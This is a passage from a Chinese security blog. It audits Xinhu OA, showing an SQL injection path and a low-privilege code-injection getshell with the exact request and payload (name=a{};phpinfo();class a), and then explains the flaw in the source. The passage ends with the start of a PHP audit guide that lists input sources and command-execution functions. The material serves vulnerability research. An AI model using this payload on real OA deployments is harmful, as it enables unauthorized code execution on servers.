class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$cont</span>  = <span class="variable">$array</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$table</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">gettables</span>(<span class="variable">$table</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$addbool</span>)&#123;</span><br><span class="line">      <span class="variable">$sql</span>=<span class="string">&quot;insert into <span class="subst">$table</span> set <span class="subst">$cont</span>&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$where</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getwhere</span>(<span class="variable">$where</span>);</span><br><span class="line">      <span class="variable">$sql</span>=<span class="string">&quot;update <span class="subst">$table</span> set <span class="subst">$cont</span> where <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">tranbegin</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里带入SQL语句查询 导致注入 同时还要注意下父类openapiAction.php中的init方法 这里的Host需要属于127.0.0.1 或 192.168.x.x 的范围.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">initAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;display= <span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$openkey</span>     = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;openkey&#x27;</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;openkey   = <span class="title function_ invoke__">getconfig</span>(<span class="string">&#x27;openkey&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;keycheck &amp;&amp; HOST != <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">contain</span>(HOST,<span class="string">&#x27;192.168&#x27;</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;openkey != <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$openkey</span> != <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;openkey))<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">showreturn</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;openkey not access&#x27;</span>, <span class="number">201</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getpostdata</span>();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="信呼OA普通用户权限getshell"><a href="#信呼OA普通用户权限getshell" class="headerlink" title="信呼OA普通用户权限getshell"></a>信呼OA普通用户权限getshell</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">index.php?d=main&amp;m=flow&amp;a=copymode&amp;ajaxbool=true</span><br><span class="line">POST:</span><br><span class="line">id=1&amp;name=a&#123;&#125;;phpinfo ();class a</span><br><span class="line"></span><br><span class="line">生成的文件：/webmain/flow/input/mode_a%7B%7D%3Bphpinfo%20%28%29%3Bclass%20aAction.php</span><br><span class="line">/webmain/model/flow/2%7B%7D%3Bphpinfo%20%28%29%3Bclass%20aModel.php</span><br><span class="line"></span><br><span class="line">其实是</span><br><span class="line">![](xinhuoaaudit/image-3.png)</span><br></pre></td></tr></table></figure><p>代码分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*复制模块</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copymodeAjax</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span> = (<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;id&#x27;</span>,<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="variable">$bhnu</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;name&#x27;</span>)));</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">isempt</span>(<span class="variable">$bhnu</span>))<span class="keyword">return</span> <span class="string">&#x27;新模块编号不能为空&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$bhnu</span>))<span class="keyword">return</span> <span class="string">&#x27;模块编号不能用数字&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$bhnu</span>)&lt;<span class="number">4</span>)<span class="keyword">return</span> <span class="string">&#x27;编号至少要4位&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">c</span>(<span class="string">&#x27;check&#x27;</span>)-&gt;<span class="title function_ invoke__">isincn</span>(<span class="variable">$bhnu</span>))<span class="keyword">return</span> <span class="string">&#x27;编号不能包含中文&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dbs</span> = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;mode&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$dbs</span>-&gt;<span class="title function_ invoke__">rows</span>(<span class="string">&quot;`num`=&#x27;<span class="subst">$bhnu</span>&#x27;&quot;</span>)&gt;<span class="number">0</span>)<span class="keyword">return</span> <span class="string">&#x27;模块编号[&#x27;</span>.<span class="variable">$bhnu</span>.<span class="string">&#x27;]已存在&#x27;</span>;</span><br><span class="line"><span class="variable">$mrs</span> = <span class="variable">$dbs</span>-&gt;<span class="title function_ invoke__">getone</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$mrs</span>)<span class="keyword">return</span> <span class="string">&#x27;模块不存在&#x27;</span>;</span><br><span class="line"><span class="variable">$ars</span> = <span class="variable">$mrs</span>;</span><br><span class="line"><span class="variable">$name</span>= <span class="variable">$mrs</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&#x27;复制&#x27;</span>;</span><br><span class="line"><span class="variable">$biaom</span>= <span class="variable">$bhnu</span>;</span><br><span class="line"><span class="variable">$obha</span> = <span class="variable">$mrs</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$ars</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$ars</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$name</span>;</span><br><span class="line"><span class="variable">$ars</span>[<span class="string">&#x27;num&#x27;</span>]  = <span class="variable">$bhnu</span>;</span><br><span class="line"><span class="variable">$ars</span>[<span class="string">&#x27;table&#x27;</span>]= <span class="variable">$biaom</span>;</span><br><span class="line"><span class="variable">$tablea</span>[] = <span class="variable">$mrs</span>[<span class="string">&#x27;table&#x27;</span>];</span><br><span class="line"><span class="variable">$tables</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">isempt</span>(<span class="variable">$ars</span>[<span class="string">&#x27;tables&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$staba</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$ars</span>[<span class="string">&#x27;tables&#x27;</span>]);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$staba</span> <span class="keyword">as</span> <span class="variable">$kz</span>=&gt;<span class="variable">$zb1</span>)&#123;</span><br><span class="line"><span class="variable">$tables</span>.=<span class="string">&#x27;,&#x27;</span>.<span class="variable">$biaom</span>.<span class="string">&#x27;zb&#x27;</span>.(<span class="variable">$kz</span>+<span class="number">1</span>).<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$zb1</span>, <span class="variable">$tablea</span>))<span class="variable">$tablea</span>[]=<span class="variable">$zb1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$tables</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$tables</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ars</span>[<span class="string">&#x27;tables&#x27;</span>] = <span class="variable">$tables</span>;</span><br><span class="line"><span class="variable">$modeid</span>  = <span class="variable">$dbs</span>-&gt;<span class="title function_ invoke__">insert</span>(<span class="variable">$ars</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//复制表</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$tablea</span> <span class="keyword">as</span> <span class="variable">$kz</span>=&gt;<span class="variable">$tabs</span>)&#123;</span><br><span class="line"><span class="variable">$sqla</span>    = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">getall</span>(<span class="string">&#x27;show create table `[Q]&#x27;</span>.<span class="variable">$tabs</span>.<span class="string">&#x27;`&#x27;</span>);</span><br><span class="line"><span class="variable">$createsql</span> = <span class="variable">$sqla</span>[<span class="number">0</span>][<span class="string">&#x27;Create Table&#x27;</span>];</span><br><span class="line"><span class="variable">$biaom1</span>   = <span class="string">&#x27;&#x27;</span>.PREFIX.<span class="string">&#x27;&#x27;</span>.<span class="variable">$biaom</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$kz</span>&gt;<span class="number">0</span>)<span class="variable">$biaom1</span>   = <span class="string">&#x27;&#x27;</span>.PREFIX.<span class="string">&#x27;&#x27;</span>.<span class="variable">$biaom</span>.<span class="string">&#x27;zb&#x27;</span>.<span class="variable">$kz</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$createsql</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;`&#x27;</span>.PREFIX.<span class="string">&#x27;&#x27;</span>.<span class="variable">$tabs</span>.<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;`&#x27;</span>.<span class="variable">$biaom1</span>.<span class="string">&#x27;`&#x27;</span>,<span class="variable">$createsql</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$createsql</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;alter table `&#x27;</span>.<span class="variable">$biaom1</span>.<span class="string">&#x27;` AUTO_INCREMENT=1&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//复制表单元素</span></span><br><span class="line"><span class="variable">$db1</span>  = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;flow_element&#x27;</span>);</span><br><span class="line"><span class="variable">$rows</span> = <span class="variable">$db1</span>-&gt;<span class="title function_ invoke__">getall</span>(<span class="string">&#x27;mid=&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$rows</span> <span class="keyword">as</span> <span class="variable">$k1</span>=&gt;<span class="variable">$rs1</span>)&#123;</span><br><span class="line"><span class="variable">$rs2</span> = <span class="variable">$rs1</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$rs2</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$rs2</span>[<span class="string">&#x27;mid&#x27;</span>] = <span class="variable">$modeid</span>;</span><br><span class="line"><span class="variable">$db1</span>-&gt;<span class="title function_ invoke__">insert</span>(<span class="variable">$rs2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//复制相关布局文件</span></span><br><span class="line"><span class="variable">$hurs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getfiles</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$hurs</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$file</span>)&#123;</span><br><span class="line"><span class="variable">$from</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;bh&#125;&#x27;</span>,<span class="variable">$obha</span>,<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$to</span>   = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;bh&#125;&#x27;</span>,<span class="variable">$bhnu</span>,<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$from</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$k</span>&lt;=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$fstr</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$from</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$k</span>==<span class="number">0</span>)<span class="variable">$fstr</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;flow_&#x27;</span>.<span class="variable">$obha</span>.<span class="string">&#x27;ClassModel&#x27;</span>,<span class="string">&#x27;flow_&#x27;</span>.<span class="variable">$bhnu</span>.<span class="string">&#x27;ClassModel&#x27;</span>,<span class="variable">$fstr</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$k</span>==<span class="number">1</span>)<span class="variable">$fstr</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;mode_&#x27;</span>.<span class="variable">$obha</span>.<span class="string">&#x27;ClassAction&#x27;</span>,<span class="string">&#x27;mode_&#x27;</span>.<span class="variable">$bhnu</span>.<span class="string">&#x27;ClassAction&#x27;</span>,<span class="variable">$fstr</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">createtxt</span>(<span class="variable">$to</span>, <span class="variable">$fstr</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">@<span class="title function_ invoke__">copy</span>(<span class="variable">$from</span>, <span class="variable">$to</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞代码主要出现在上面，可以看到<code>$bhnu = strtolower(trim($this-&gt;post(&#39;name&#39;)));</code>接收了外部输入，且在下面的copy中有使用到<code>$to</code>，这个变量是输入经过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$to</span>   = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;bh&#125;&#x27;</span>,<span class="variable">$bhnu</span>,<span class="variable">$file</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">createtxt</span>(<span class="variable">$to</span>, <span class="variable">$fstr</span>);</span><br></pre></td></tr></table></figure><p>处理的，跟进createtxt函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*写入文件</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createtxt</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$txt</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">createdir</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="variable">$path</span>= <span class="string">&#x27;&#x27;</span>.ROOT_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$path</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">@<span class="variable">$file</span>= <span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line"><span class="variable">$bo</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>)&#123;</span><br><span class="line"><span class="variable">$bo</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$txt</span>)<span class="variable">$bo</span> = <span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>,<span class="variable">$txt</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$bo</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到可以直接写入文件而没有过滤<br>写入的文件内容：<code>mode_a&#123;&#125;;phpinfo ();class aAction.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*此文件是流程模块【gong.通知公告】对应接口文件。</span></span><br><span class="line"><span class="comment">*可在页面上创建更多方法如：public funciton testactAjax()，用js.getajaxurl(&#x27;testact&#x27;,&#x27;mode_gong|input&#x27;,&#x27;flow&#x27;)调用到对应方法</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mode_a</span></span>&#123;&#125;;<span class="title function_ invoke__">phpinfo</span> ();<span class="class"><span class="keyword">class</span> <span class="title">aClassAction</span> <span class="keyword">extends</span> <span class="title">inputAction</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">savebefore</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$arr</span>, <span class="variable">$id</span>, <span class="variable">$addbo</span></span>)</span>&#123;</span><br><span class="line"><span class="comment">//$uarr[&#x27;receid&#x27;] = $this-&gt;flow-&gt;getreceids($arr[&#x27;receid&#x27;]);</span></span><br><span class="line"><span class="variable">$uarr</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;issms&#x27;</span>]))<span class="variable">$uarr</span>[<span class="string">&#x27;issms&#x27;</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;rows&#x27;</span> =&gt; <span class="variable">$uarr</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">saveafter</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$arr</span>, <span class="variable">$id</span>, <span class="variable">$addbo</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//提交投票</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">submittoupiaoAjax</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$mid</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;mid&#x27;</span>);</span><br><span class="line"><span class="variable">$sid</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;sid&#x27;</span>);</span><br><span class="line"><span class="variable">$modenum</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;modenum&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;flow= <span class="title function_ invoke__">m</span>(<span class="string">&#x27;flow&#x27;</span>)-&gt;<span class="title function_ invoke__">initflow</span>(<span class="variable">$modenum</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$towheer</span>= <span class="string">&quot;`table`=&#x27;infor&#x27; and `mid`=&#x27;<span class="subst">$mid</span>&#x27; and `name`=&#x27;投票&#x27; and `checkid`=&#x27;<span class="subst">$this</span>-&gt;adminid&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;flow-&gt;flogmodel-&gt;<span class="title function_ invoke__">rows</span>(<span class="variable">$towheer</span>)&gt;<span class="number">0</span>)<span class="keyword">return</span> <span class="string">&#x27;你已投票了&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;flow-&gt;<span class="title function_ invoke__">addlog</span>(<span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;投票&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;mid&#x27;</span>  =&gt; <span class="variable">$mid</span>,</span><br><span class="line"><span class="string">&#x27;explain&#x27;</span> =&gt; <span class="string">&#x27;投票项ID(&#x27;</span>.<span class="variable">$sid</span>.<span class="string">&#x27;)&#x27;</span> </span><br><span class="line">));</span><br><span class="line"><span class="title function_ invoke__">m</span>(<span class="string">&#x27;infors&#x27;</span>)-&gt;<span class="title function_ invoke__">update</span>(<span class="string">&#x27;`touci`=`touci`+1&#x27;</span>,<span class="string">&#x27;`mid`=&#x27;</span>.<span class="variable">$mid</span>.<span class="string">&#x27; and `id` in(&#x27;</span>.<span class="variable">$sid</span>.<span class="string">&#x27;)&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要原因是在copymodeAjax 中 str_replace 把类名换了 然后 刚好payload可以闭合前面的内容，实现插入代码</p>]]></content>
      
      
      <categories>
          
          <category> Code Audit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> OA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【代码审计】PHP代码审计</title>
      <link href="/2024/10/02/WebSecurity/codeaudit/phpaudit/"/>
      <url>/2024/10/02/WebSecurity/codeaudit/phpaudit/</url>
      
        <content type="html"><![CDATA[<p>PHP代码审计入门指南  <a href="https://www.yuque.com/burpheart/phpaudit/">https://www.yuque.com/burpheart/phpaudit/</a><br>PHP-Audit-Labs <a href="https://github.com/hongriSec/PHP-Audit-Labs?tab=readme-ov-file">https://github.com/hongriSec/PHP-Audit-Labs?tab=readme-ov-file</a></p><h2 id="PHP-用户可控输入"><a href="#PHP-用户可控输入" class="headerlink" title="PHP 用户可控输入"></a>PHP 用户可控输入</h2><table><thead><tr><th>框架&#x2F;全局变量</th><th>获取URL参数（GET）</th><th>获取POST参数</th><th>获取上传文件</th><th>获取Cookie参数</th><th>获取服务器参数</th><th>获取请求体</th><th>获取JSON数据</th><th>文件上传方法</th></tr></thead><tbody><tr><td>PHP原生</td><td>$_GET</td><td>$_POST</td><td>$_FILES</td><td>$_COOKIE</td><td>$_SERVER</td><td>php:&#x2F;&#x2F;input</td><td>无</td><td>无</td></tr><tr><td>ThinkPHP5</td><td>Request::instance()-&gt;get(); input(‘get.’)</td><td>Request::instance()-&gt;post(); input(‘post.’)</td><td>Request::instance()-&gt;file();</td><td>Request::instance()-&gt;cookie(); input(‘cookie.’)</td><td>Request::instance()-&gt;server(); input(‘server.’)</td><td>Request::instance()-&gt;request(); input(‘request.’)</td><td>Request::instance()-&gt;get(); input(‘get.’);</td><td>$request-&gt;getJSON();</td></tr><tr><td>ThinkPHP3.*</td><td>I(‘get.’)</td><td>I(‘post.’)</td><td>无</td><td>无</td><td>无</td><td>无</td><td>无</td><td>无</td></tr><tr><td>Codeigniter2&#x2F;3</td><td>$this-&gt;input-&gt;get()</td><td>$this-&gt;input-&gt;post()</td><td>$this-&gt;input-&gt;file()</td><td>$this-&gt;input-&gt;cookie()</td><td>$this-&gt;input-&gt;server()</td><td>$this-&gt;input-&gt;post()</td><td>$this-&gt;input-&gt;raw_input_stream</td><td>无</td></tr><tr><td>Codeigniter4</td><td>$request-&gt;getGet()</td><td>$request-&gt;getPost()</td><td>$request-&gt;getFiles()</td><td>$request-&gt;getCookie()</td><td>$request-&gt;getServer()</td><td>$request-&gt;getPost(); $request-&gt;getJSON();</td><td>$request-&gt;getJSON()</td><td>$this-&gt;request-&gt;getFiles();</td></tr><tr><td>CakePHP 4.*</td><td>$this-&gt;request-&gt;getQuery(‘’);</td><td>$this-&gt;request-&gt;getData(‘’);</td><td>$this-&gt;request-&gt;getUploadedFile(‘’);</td><td>无</td><td>$this-&gt;request-&gt;getServer();</td><td>$this-&gt;request-&gt;getData(‘’);</td><td>$this-&gt;request-&gt;input(‘json_decode’);</td><td>无</td></tr><tr><td>Yii 2.0</td><td>$request-&gt;get();</td><td>$request-&gt;post();</td><td>$request-&gt;getBodyParam(‘’);</td><td>$request-&gt;getCookies();</td><td>$request-&gt;getHeaders();</td><td>$request-&gt;getBodyParam(‘’);</td><td>无</td><td>无</td></tr><tr><td>Laravel</td><td>$request-&gt;query(‘’);</td><td>$request-&gt;input(‘’);</td><td>$request-&gt;file(‘’);</td><td>$request-&gt;cookie(‘’);</td><td>无</td><td>$request-&gt;input(‘’);</td><td>$request-&gt;json();</td><td>$request-&gt;file(‘’);</td></tr></tbody></table><h2 id="PHP-敏感函数"><a href="#PHP-敏感函数" class="headerlink" title="PHP 敏感函数"></a>PHP 敏感函数</h2><table><thead><tr><th>函数&#x2F;语法</th><th>描述</th><th>例子</th></tr></thead><tbody><tr><td>system</td><td>执行命令并输出结果</td><td>system(‘id’);</td></tr><tr><td>exec</td><td>执行命令 只可获取最后一行结果</td><td>exec(‘id’, $a); print_r($a);</td></tr><tr><td>passthru</td><td>同 system</td><td>passthru(‘id’);</td></tr><tr><td>shell_exec</td><td>执行命令并返回结果</td><td>$a&#x3D;shell_exec(‘id’); print_r($a);</td></tr><tr><td>&#96; 